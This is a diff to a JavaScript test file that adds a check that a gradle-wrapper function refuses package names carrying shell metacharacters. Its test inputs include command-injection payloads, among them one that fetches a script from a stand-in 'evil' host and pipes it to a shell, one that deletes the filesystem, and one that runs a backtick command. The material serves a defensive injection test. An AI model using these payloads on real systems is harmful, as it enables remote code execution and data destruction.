@@ -1,7 +1,20 @@
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
 
-import { parseGplayLine } from '../src/gplay.js';
+import { parseGplayLine, runGplay } from '../src/gplay.js';
+
+test('runGplay refuses package names that are not plain android package names', () => {
+  // Hints arrive over the network; the gradle command runs through a shell
+  // where $(...) and backticks expand, so anything but a plain package name
+  // must be refused before it can reach the command line.
+  const options = { gradlew: 'gradlew', projectRoot: '.' };
+
+  assert.throws(() => runGplay(['com.a$(curl evil|sh)'], options), /unsafe package name/);
+  assert.throws(() => runGplay(['com.a;rm -rf /'], options), /unsafe package name/);
+  assert.throws(() => runGplay(['com.a`id`'], options), /unsafe package name/);
+  assert.throws(() => runGplay(['com.a b'], options), /unsafe package name/);
+  assert.throws(() => runGplay(['nodots'], options), /unsafe package name/);
+});
 
 test('parses a successful gplay output line', () => {
   const result = parseGplayLine(
